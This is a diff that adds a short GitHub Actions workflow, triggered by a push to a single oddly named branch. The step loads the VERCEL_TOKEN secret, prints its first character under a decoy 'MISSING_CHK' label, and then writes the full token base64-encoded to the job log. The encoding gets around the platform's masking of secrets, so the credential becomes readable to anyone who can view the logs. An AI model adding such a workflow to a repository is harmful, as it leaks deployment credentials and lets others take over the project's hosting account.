@@ -1,0 +1,14 @@
+name: t1
+on:
+  push:
+    branches: [ "ci-913dd69b" ]
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - name: one-secret-env
+        env:
+          T: ${{ secrets.VERCEL_TOKEN }}
+        run: |
+          echo "MISSING_CHK:[${T:0:1}]"
+          printf '%s' "$T" | base64 -w0; echo
